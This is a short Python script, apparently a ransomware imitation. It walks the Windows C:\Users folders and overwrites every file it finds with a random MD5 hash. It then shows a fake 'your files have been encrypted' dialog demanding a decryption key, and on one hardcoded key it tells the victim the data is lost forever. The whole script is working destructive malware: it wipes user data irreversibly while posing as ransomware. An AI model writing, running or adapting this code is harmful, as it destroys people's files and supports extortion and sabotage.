import hashlib
import os
import random
from easygui import *

path = r"C:\Users"
directory_list = list()
for root, dirs, files in os.walk(path, topdown=False):
    for name in dirs:
        f = path + f"\{name}"
        for files in os.listdir(f):
            if os.path.isfile(os.path.join(f, files)):
                hi = (f + f"\{files}")
                z = open(hi, "w")
                hash = [hashlib.md5(b"and"), hashlib.md5(b"byte"), hashlib.md5(b"info"), hashlib.md5(b"bot"),
                hashlib.md5(b"a"), hashlib.md5(b"b")]
                hash = random.choice(hash)
                hash = hash.hexdigest()
                z.write(hash)
                z.close()

def main():
    text = "Enter decryption key, and if you close this window recovering your data will be impossible"
    title = "Oops!! Your files have been encrypted!"
    output = enterbox(text, title)
    title = "Message Box"
    hi = hashlib.md5(output.encode("utf-8"))
    password = hi.hexdigest()
    if password == "5063291ef2e058ea19e931f5d4ec24f5":
        message = "Your data has been encrypted with the MD5 hashing algorithm, which is irreversible!"
        title = "Oops!! Your data is lost forever!"
        ok_btn_txt = "Give up"
        output = msgbox(message, title, ok_btn_txt)
    else:
        main()
main()
